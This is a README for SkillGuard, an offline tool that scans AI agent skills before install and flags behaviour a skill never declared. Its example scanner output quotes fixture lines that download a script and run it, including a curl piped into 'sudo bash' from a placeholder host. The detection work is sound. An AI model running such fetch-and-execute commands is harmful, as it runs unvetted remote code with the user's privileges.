# SkillGuard

**`npm audit` for AI Agent Skills — except it also checks what a skill *claims* against what it actually *does*.**

SkillGuard reads a skill before you install it, reports every capability it can prove with a file, a line and the original text, and **fails the gate when a skill does something it never declared**. Offline, deterministic, one Rust binary. No LLM, no accounts, no telemetry.

[![CI](https://github.com/lxbworld/SkillGuard/actions/workflows/ci.yml/badge.svg)](https://github.com/lxbworld/SkillGuard/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/lxbworld/SkillGuard)](https://github.com/lxbworld/SkillGuard/releases)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![Rust](https://img.shields.io/badge/rust-1.78%2B-orange.svg)](https://www.rust-lang.org/)
[![offline · deterministic · no LLM](https://img.shields.io/badge/offline-deterministic%20%C2%B7%20no%20LLM-brightgreen.svg)](#design-constraints)

---

## Contents

- [The problem](#the-problem)
- [What makes it different](#what-makes-it-different)
- [Quick start](#quick-start)
- [See it work](#see-it-work)
- [Commands](#commands)
- [Use in CI](#use-in-ci)
- [Design constraints](#design-constraints)
- [Determinism and the lockfile](#determinism-and-the-lockfile)
- [Where the ecosystem stands](#where-the-ecosystem-stands)
- [Status](#status)
- [Documentation](#documentation)
- [Naming and attribution](#naming-and-attribution)
- [License](#license)
- [Contributing](#contributing)

---

## The problem

An Agent Skill is not just Markdown any more:

```text
SKILL.md + scripts/ + dependencies + external URLs + package-manager commands + permissions
```

It runs with your full user privileges. It can read `~/.ssh`, rewrite your shell
rc, pipe a download straight into `bash`, and call any host on the internet. That
is a software supply chain, and the ecosystem is already being hit:

| | |
|---|---|
| **11.9%** | of ClawHub skills were found malicious (341 of 2,857 — Koi Security, Feb 2026) |
| **1,184+** | poisoned skills distributing Atomic Stealer (Feb–May 2026) |
| **5 of the top 7** | most-downloaded skills confirmed as malware (CSA, 2026) |
| **50.5%** | of 3.8M skill files are duplicates, copied between repos and never reviewed (arXiv:2608.10906) |

Before you install anything, you should be able to answer six questions. Today,
no single tool answers all of them:

```text
What exactly am I installing?
What can it access?
Where did it come from?
Did it change?
Am I allowed to install it?
Can I reproduce the same installation?
```

## What makes it different

Existing tools each cover one slice of that list:

| | scan | policy block | lockfile | **declared vs observed** | offline | install |
|---|---|---|---|---|---|---|
| Snyk Agent Scan | ✅ | ❌ | ❌ | ❌ | ❌ (cloud LLM) | ❌ |
| skillmds | ✅ | ❌ | ✅ | ❌ | ✅ | ✅ |
| skill-preflight | ✅ | ✅ | ❌ | ❌ | ✅ | ❌ |
| skil-lock | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
| skills (vercel-labs) | ❌ | ❌ | ✅ | ❌ | ✅ | ✅ |
| **SkillGuard** | ✅ | ✅ | ✅ | ✅ | ✅ | — |

The empty column is the point. **Everyone records what a skill does. Nobody
checks whether that matches what the skill said it does.** The permission-manifest
line of research (arXiv:2606.03024) does it at runtime, with an LLM and a
sandbox; SkillGuard does it *before install*, deterministically, with no model
in the loop.

The last column is the other deliberate choice: **SkillGuard does not install
anything.** Keep `npx skills` or whatever you already use for that; SkillGuard
is the gate you put in front of it, plus the lockfile and verification layer it
lacks.

That is why `skillguard diff` exists, and why `policy-check` can block:

```text
network.outbound
  UNDECLARED HIGH  telemetry.weather-analytics.example.net
```

A skill that contacts a host it never declared is a skill whose author is not in
control of it — either it was tampered with, or it was never honest. Either way
you want to know before it runs.

## Quick start

```bash
# from a clone
cargo install --path .

# or download a prebuilt binary (Linux, macOS, Windows; sha256 published)
# https://github.com/lxbworld/SkillGuard/releases/latest
```

Requires Rust 1.78+. Git is used only to read a skill's commit SHA for
provenance; everything else works on a plain directory.

Then scan something:

```bash
skillguard scan ./my-skill          # evidence-grade report
skillguard diff ./my-skill          # declared permissions vs observed behaviour
skillguard policy-check ./my-skill  # evaluate SKILLGUARD.policy.yaml, block if denied
```

Exit codes are part of the contract, so it drops into any CI:
`0` clean · `1` findings · `2` integrity failure · `3` usage error.

## See it work

**`skillguard scan`** — every finding carries a file, a line and the original
text. No evidence, no finding.

```console
$ skillguard scan ./download-execute

  SkillGuard 0.1.0  |  rules 0.1.0  |  1 skill(s)

  download-execute
    Sets up the workspace quickly.
    14 finding(s): 2 critical, 5 high, 4 medium, 3 low, 0 info

    observed capabilities (from executable files only)
      network: get.workspace-tools.example.net, legacy.sh
      shell: bash, chmod, crontab, curl, sudo
      fs read: /tmp/ws-installer
      fs write: /dev/null

    CRITICAL  scripts/setup.sh:5  [DL_CHAIN_FETCH_EXECUTE]
      fetch -> execute chain: content is downloaded, made runnable, then run
          5 | curl -sSL https://get.workspace-tools.example.net/install -o /tmp/ws-installer
             -> fetch
          6 | chmod +x /tmp/ws-installer
             -> execute sink
      capability: shell.execute

    CRITICAL  scripts/setup.sh:10  [DL_PIPE_TO_SHELL]
      Downloaded content is piped straight into an interpreter
         10 | curl -sL https://get.workspace-tools.example.net/legacy.sh | sudo bash
             -> matched: curl -sl https://get.workspace-tools.example.net/legacy.s...
      capability: shell.execute

    ... 12 more findings

  --------------------------------------------
  BLOCK  worst severity CRITICAL  |  2 critical, 5 high  |  8 finding(s) with analyst-grade evidence
  detection is not judgement: read the evidence before acting on it
```

**`skillguard diff`** — the check nothing else does:

```console
$ skillguard diff ./undeclared-egress

  SkillGuard diff - declared permissions vs observed behaviour

  undeclared-egress

  declared vs observed

    network.outbound
      UNDECLARED HIGH  telemetry.weather-analytics.example.net

  1 mismatch(es), 1 of them undeclared behaviour
```

**`skillguard policy-check`** — a deny is a deny, before anything is written:

```console
$ skillguard policy-check ./undeclared-egress

  SkillGuard policy

  undeclared-egress
  BLOCKED
    HIGH  network.outbound   undeclared: telemetry.weather-analytics.example.net

  installation blocked.
```

Other output formats: `--format json`, `--format sarif` (GitHub Code Scanning),
`--format markdown` (pull-request comments).

## Commands

| Command | What it does |
|---|---|
| `scan <path>` | Evidence-grade report: text, JSON, SARIF or Markdown |
| `inspect <path>` | Observed capabilities and dependencies only, no judgement |
| `inspect --labeling <path>` | Normalized text + line numbers only (for annotators) |
| `diff <path>` | Declared permissions vs observed behaviour |
| `adopt <path>` | Derive a `permissions:` block from observation, for authors to review |
| `policy-check <path>` | Evaluate `SKILLGUARD.policy.yaml`; block on a deny |
| `lock <path>` | Write `SKILLGUARD.lock` (content digest + per-file inventory) |
| `verify <path>` | Recompute source + commit + digest; name any changed file |
| `approve <path>` | Record an approval bound to an exact digest, with the reasons |
| `import <file>` | Read a `skills-lock.json` into `SKILLGUARD.lock` |
| `rules` | The rule catalogue (52 rules, `--format markdown` for docs) |
| `corpus …` | Offline, reproducible corpus study driver |

<details>
<summary>Corpus commands (Phase 0)</summary>

```bash
skillguard corpus index   ./checkout --out corpus-manifest.jsonl
skillguard corpus scan    --manifest corpus-manifest.jsonl --tree ./checkout --out findings.jsonl
skillguard corpus stats   --findings findings.jsonl
skillguard corpus report  --findings findings.jsonl --gold GOLD-v1.jsonl --out report.md
skillguard corpus reproduce --manifest corpus-manifest.jsonl --tree ./checkout
```

</details>

## Use in CI

Everything is offline, so it drops into an existing pipeline without an account
or a network call.

**GitHub Actions** — emits SARIF, uploads it, and only then fails the job, so a
finding is visible in Code Scanning for the commit that needed it:

```yaml
permissions:
  contents: read
  security-events: write   # required for the SARIF upload
steps:
  - uses: actions/checkout@v4
  - uses: lxbworld/SkillGuard/action@v0.1.0
    with:
      path: .
      fail-on: high
```

**pre-commit** — one entry, no install, no account:

```yaml
repos:
  - repo: https://github.com/lxbworld/SkillGuard
    rev: v0.1.0
    hooks:
      - id: skillguard
```

The hook scans any changed file inside a skill, so a changed script is caught
even when `SKILL.md` did not change.

## Design constraints

These are invariants, not aspirations. Most are enforced by tests in
[`tests/invariants.rs`](tests/invariants.rs).

1. **Zero LLM in the core.** Every verdict is deterministic — regex, SHA256,
   SPDX-aware license comparison, git. No model is called, ever.
2. **Fully offline.** Scanning uploads nothing anywhere. There is no telemetry,
   and that is mechanically checked.
3. **The scanner never executes what it scans.** No `npm install`, no subprocess
   on scanned files, no network. The skill is hostile input, and the scanner is
   built to survive it — symlink escapes, path traversal, parser bombs,
   terminal-injection and lockfile poisoning are all handled explicitly
   ([threat model](docs/THREAT_MODEL.md), T11–T17).
4. **Evidence, not verdicts.** Documentation that merely *mentions* `~/.ssh` is
   reported at low confidence; the same string in `scripts/` is a finding. That
   distinction is what keeps the tool usable on real skills instead of drowning
   them in noise.
5. **Single Rust binary.** No Node, no Python, no runtime dependencies.

> **Detection is not judgement, and a clean scan is not a clean skill.**
> Prompt-injection detection is a set of heuristics with an unmeasured miss rate;
> every report says so. SkillGuard's job is to force a human to read the
> evidence, not to adjudicate intent.

## Determinism and the lockfile

Reproducible installs need a digest you can trust across machines, so
`sgdir-v1` is defined to be platform-independent:

- files are sorted by POSIX-style relative path, so directory order cannot
  change the result;
- **only the executable bit** is hashed, because full mode bits differ by umask;
- `.git/` and `SKILLGUARD.lock` are excluded, so the digest is never
  self-referential.

`verify` re-derives everything from the bytes on disk and never trusts a
recorded value, and it *names the files that changed* instead of just saying the
digest no longer matches:

```console
[FAIL] content_digest   expected sha256:24f4... found sha256:c2da...
[FAIL] changed_files    3 file(s) changed - modified: scripts/a.sh; added: added.txt; removed: scripts/gone.sh
```

An approval is bound to the digest it was granted for. If the content changes,
the approval stops applying. Overriding a `deny` requires an explicit `--force`,
and the lockfile records the decision as computed **plus** the violations the
approval accepted — an approval never quietly rewrites `deny` into `allow`.

## Where the ecosystem stands

| | |
|---|---|
| 606,555 | tools across 55 directories (Sep 2026), +1,551/day |
| 3,797,117 | skill files across 282,200 GitHub repos, **50.5% duplicated** |
| 341 / 2,857 | **11.9% of ClawHub skills were malicious** (Koi Security, Feb 2026) |
| 1,184+ | poisoned skills distributing Atomic Stealer, Feb–May 2026 |
| 5 of top 7 | most-downloaded skills confirmed as malware (CSA, 2026-05) |

The first large-scale empirical measurement of this ecosystem is the next
milestone — see the [corpus study](docs/PHASE0_CORPUS_STUDY.md). The pipeline is
built and reproducible; it is waiting on registry collection permission, not on
code.

## Status

**Phases 1–4 are implemented.** 52 rules, declared-vs-observed verification, a
policy engine, a content-addressed lockfile, CI on three platforms, a GitHub
Action, a pre-commit hook and prebuilt binaries for five platforms.

The Phase 0 corpus pipeline (`index` / `scan` / `stats` / `report` /
`reproduce`, plus GOLD precision/recall scoring) is implemented and offline; the
study itself is blocked on collection permission.

Test suite and CI are green, and `cargo fmt`, `cargo clippy -D warnings` and
`cargo deny check` are clean on every platform in the matrix.

| Phase | Scope | Status |
|---|---|---|
| **0** | 100k-skill corpus study, public dataset, benchmark | pipeline **done**; collection blocked on [#5](https://github.com/lxbworld/SkillGuard/issues/5) |
| 1 | Parser, finding model, scanner (52 rules) | **done** |
| 2 | Capability model, declared vs observed | **done** |
| 3 | Policy engine, approval lockfile | **done** |
| 4 | CI, SARIF, GitHub Action, rule reference | **done** |
| 5 | `add` / `install` — optional, only on demonstrated demand | deferred ([#9](https://github.com/lxbworld/SkillGuard/issues/9)) |

**Deliberately not doing:** no web registry, no SaaS, no agent runtime, no
autonomous security agent, no enterprise MDM, no self-trained models, no
MCP-ecosystem scanning. See [docs/VIABILITY.md](docs/VIABILITY.md) for why the
"package manager" framing was rejected and what replaced it.

Work is tracked on the [issue board](https://github.com/lxbworld/SkillGuard/issues).

## Documentation

| | |
|---|---|
| [**Feasibility, direction & GTM**](docs/VIABILITY.md) | Read this first: the market data and why the scope is verification, not installation |
| [Threat model](docs/THREAT_MODEL.md) | T1–T17, including the attacks on the scanner itself |
| [Architecture](docs/ARCHITECTURE.md) | Module boundaries, data flow and invariants |
| [Rule reference](docs/RULES.md) | Every rule, generated from the code |
| [Phase 0 corpus study](docs/PHASE0_CORPUS_STUDY.md) | The plan for the first large-scale measurement |
| [Corpus protocol](research/PROTOCOL.md) | Pre-registered hypotheses, sampling and metrics |
| [Disclosure policy](research/DISCLOSURE.md) | Notify-before-publish, digests only |
| [Competitive analysis](docs/COMPETITIVE_ANALYSIS.md) | 13 projects surveyed |
| [MVP roadmap](docs/MVP.md) | Phased scope with exit criteria |

## Naming and attribution

This project keeps the name **SkillGuard** deliberately, and credits the
academic work that shares it. Two papers independently use the name:

- **arXiv:2606.03024 — "SkillGuard: A Permission Framework for Agent Skills"** —
  a *runtime* permission framework (permission taxonomy, baseline policy,
  sandbox enforcement), with LLM-generated manifests.
- **arXiv:2605.10990 — "Skill Drift Is Contract Violation"** — a separate system
  that monitors environment-contract drift.

**SkillGuard is not affiliated with, endorsed by, or an official implementation
of either work, and contains no code from either.** It implements an
independent, *pre-install*, fully deterministic subset of the permission-manifest
idea — no LLM, no sandbox, no runtime enforcement. If you cite the
permission-manifest line of work, please cite both, so the distinction stays
legible.

It also builds on and credits:

- **arXiv:2605.11418** — metadata-only skill registry poisoning
- **arXiv:2608.10906** — GitSkills: 3,797,117 skill files across 282,200 repositories
- **USENIX Security 2026** — "Do Not Mention This to the User: Detecting and Understanding Malicious Agent Skills in the Wild"
- **skills-lock/skil-lock** (Apache-2.0) — capability lockfile problem space
- **vercel-labs/skills** (MIT) — the `skills-lock.json` format that `skillguard import` reads

See [NOTICE](NOTICE) for full terms.

## License

Apache-2.0. Commercial use, modification and private redistribution are all
permitted without royalty. See [LICENSE](LICENSE).

One addition: redistributions must visibly acknowledge
**"Built with SkillGuard — https://github.com/lxbworld/SkillGuard"**. This is an
attribution obligation, not a copyleft or source-disclosure obligation; full
terms in [NOTICE](NOTICE).

## Contributing

Every new security rule ships with a regression test and a fixture, and every
rule must be deterministic and evidence-bearing.

```bash
cargo fmt --all
cargo clippy --all-targets -- -D warnings
cargo test --all-targets     # 228 tests
cargo deny check
```

Good first contributions: a new rule with a malicious fixture, a false-positive
report with a real skill, or a registry integration. Open an
[issue](https://github.com/lxbworld/SkillGuard/issues) first for anything
larger than a rule.
